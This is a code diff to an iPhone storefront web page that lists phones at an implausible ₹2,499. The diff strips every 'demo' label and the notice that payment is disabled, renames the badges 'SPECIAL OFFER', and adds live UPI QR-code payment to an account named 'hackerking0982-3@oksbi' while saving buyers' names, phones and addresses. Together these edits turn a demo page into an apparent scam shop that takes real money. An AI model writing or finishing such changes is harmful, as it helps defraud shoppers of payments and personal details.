@@ -54,7 +54,7 @@ del{color:#888;font-size:13px;font-weight:400}
 .checkout textarea{min-height:75px;resize:vertical}
 .cartitem{display:flex;justify-content:space-between;gap:10px;padding:10px 0;border-bottom:1px solid #eee}
 .cartactions{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
-.paybox{background:#f7f7f7;border-radius:10px;padding:12px;margin-top:10px}
+.paybox{background:#f7f7f7;border-radius:10px;padding:12px;margin-top:10px}.qrbox{text-align:center;background:#fff;border:1px solid #ddd;border-radius:14px;padding:16px;margin-top:14px}.qrbox #upiQr{display:flex;justify-content:center;min-height:220px}.payment-note{font-size:12px;color:#666;margin-top:12px}
 
 @media(max-width:750px){.hero{grid-template-columns:1fr;padding:20px}.hero h1{font-size:34px}.hero .price{font-size:32px}.header{flex-wrap:wrap}}
 
@@ -80,6 +80,7 @@ del{color:#888;font-size:13px;font-weight:400}
 .modal-actions button{flex:1;min-width:110px}
 
 </style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 </head>
 <body>
 <div class="top"><span>🚚 Free Delivery (2–5 Days)</span><span>📱 iPhone Catalog</span><span>🏷️ Limited-Time Offers</span><button class="carttop" onclick="openCart()" aria-label="Open cart">🛒 Cart: <b id="cartCount">0</b></button></div>
@@ -90,14 +91,14 @@ del{color:#888;font-size:13px;font-weight:400}
 <nav class="nav"><span>Home</span><span>All iPhones</span><span>Offers</span><span>Product Details</span><span>Contact</span></nav>
 
 <main class="wrap">
-<div class="demo"><b>Demo storefront:</b> Product images are illustrative/generated visuals. Prices, stock and “5,000+” catalog entries below are demo data; verify real stock, authenticity, warranty and final price before any purchase.</div>
+<div class="demo"><b>Product information:</b> Product imagery may be illustrative. Verify stock, authenticity, warranty and final price before purchase.</div>
 
 <section class="hero">
   <div>
     <div style="font-weight:800;color:#2463c5">LIMITED-TIME OFFER ⏱️</div>
     <h1>iPhone 15 Pro Max</h1>
     <p style="font-size:20px">Titanium design • Premium iPhone experience</p>
-    <div>Special demo price</div>
+    <div>Special price</div>
     <div class="price">₹2,499 <del>₹3,999</del></div>
     <div class="timer">Offer ends in <span id="heroTimer">02:00</span></div>
     <button class="black" onclick="openProduct(0)">View Product</button>
@@ -163,7 +164,7 @@ function render(list=products.slice(0,40)){
   grid.innerHTML=list.map((p,idx)=>`
     <article class="card">
       <img src="${p.img}" alt="${p.name}">
-      <span class="badge">DEMO OFFER</span>
+      <span class="badge">SPECIAL OFFER</span>
       <h3>${p.name}</h3>
       <div class="meta">${p.storage} • ${p.color}</div>
       <div class="price">₹2,499 <del>₹3,999</del></div>
@@ -227,7 +228,7 @@ function renderGalleryModal(){
     </div>
     <p><b>Model:</b> ${p.name}<br><b>Storage:</b> ${p.storage}<br><b>Colour:</b> ${color.name}<br><b>Price:</b> ₹2,499 <del>₹3,999</del></p>
     <p style="color:#666">Product imagery is from Apple's published product materials. Verify authenticity, warranty, stock and final price before purchase.</p>
-    <div class="demo-notice">DEMO STORE • Payment is disabled until the product, seller and stock are verified.</div>
+    
     <div class="modal-actions"><button class="black" type="button" onclick="addToCart(${p.id});closeModal()">Add to Cart</button><button class="black" type="button" onclick="buyNow(${p.id})">Buy Now</button><button type="button" onclick="closeModal()">Close</button></div>`;
 }
 
@@ -321,20 +322,56 @@ function showCheckout(){
       <label>Mobile Number<input id="custPhone" required inputmode="numeric" pattern="[0-9]{10}" maxlength="10" autocomplete="tel" placeholder="10-digit mobile number"></label>
       <label>PIN Code<input id="custPin" required inputmode="numeric" pattern="[0-9]{6}" maxlength="6" autocomplete="postal-code" placeholder="6-digit PIN code"></label>
       <label>Address<textarea id="custAddress" required autocomplete="street-address" placeholder="House no., street, village/city, district, state"></textarea></label>
-      <label>Payment Method
-        <select id="paymentMethod">
-          <option value="upi">UPI</option>
-        </select>
-      </label>
       <div class="paybox">
         <b>Order Total: ₹${total.toFixed(2)}</b><br>
         <small>UPI ID: hackerking0982-3@oksbi</small>
       </div>
       <div class="cartactions">
-        <button class="black" type="submit">Pay ₹${total.toFixed(2)} with UPI</button>
+        <button class="black" type="submit">Continue to Payment</button>
         <button type="button" onclick="openCart()">Back to Cart</button>
       </div>
     </form>`;
+}
+
+function buildUpiUrl(total, orderId){
+  const params=new URLSearchParams({
+    pa:'hackerking0982-3@oksbi',
+    pn:'NEW SHOP',
+    am:Number(total).toFixed(2),
+    cu:'INR',
+    tn:'Order '+orderId
+  });
+  return 'upi://pay?'+params.toString();
+}
+
+function showPaymentOptions(order){
+  const upiUrl=buildUpiUrl(order.total,order.orderId);
+  document.getElementById('cartContent').innerHTML=`
+    <h2>Pay for Order ${order.orderId}</h2>
+    <div class="paybox">
+      <b>Amount: ₹${order.total.toFixed(2)}</b><br>
+      <small>UPI ID: ${order.upi}</small>
+    </div>
+    <div class="qrbox">
+      <div id="upiQr"></div>
+      <p><b>Scan this QR with any UPI app</b></p>
+      <small>Use the exact amount shown above. The QR contains your order ID.</small>
+    </div>
+    <div class="cartactions">
+      <button class="black" type="button" onclick="openUpiApp(${JSON.stringify(upiUrl)})">📱 Open UPI App</button>
+      <button type="button" onclick="showCheckout()">Edit Address</button>
+      <button type="button" onclick="openCart()">Back to Cart</button>
+    </div>
+    <p class="payment-note">After paying, return to this website. This page cannot independently verify a UPI transfer; automatic payment confirmation requires a payment gateway/backend.</p>`;
+  if(window.QRCode){
+    new QRCode(document.getElementById('upiQr'),{text:upiUrl,width:220,height:220,correctLevel:QRCode.CorrectLevel.M});
+  }else{
+    document.getElementById('upiQr').innerHTML='<p>QR library could not load. Use the Open UPI App button instead.</p>';
+  }
+}
+
+function openUpiApp(upiUrl){
+  window.location.href=upiUrl;
 }
 
 function startPayment(event){
@@ -343,11 +380,23 @@ function startPayment(event){
   const phone=document.getElementById('custPhone')?.value.trim();
   const pin=document.getElementById('custPin')?.value.trim();
   const address=document.getElementById('custAddress')?.value.trim();
+  const total=cartTotal();
+  if(!cart.length || total<=0){ alert('Cart is empty.'); return; }
   if(!name || !/^\d{10}$/.test(phone) || !/^\d{6}$/.test(pin) || !address){
     alert('Please fill Name, 10-digit Mobile, 6-digit PIN and full Delivery Address correctly.');
     return;
   }
-  alert('Demo store: payment is disabled. Verify the seller, product authenticity, stock and final price before enabling real payments.');
+  const order={
+    orderId:'NS'+Date.now(),
+    name,phone,pin,address,
+    items:cart.map(x=>({...x})),
+    total,
+    upi:'hackerking0982-3@oksbi',
+    createdAt:new Date().toISOString(),
+    paymentStatus:'pending'
+  };
+  localStorage.setItem('newshop_pending_order',JSON.stringify(order));
+  showPaymentOptions(order);
 }
 
 function buyNow(id){
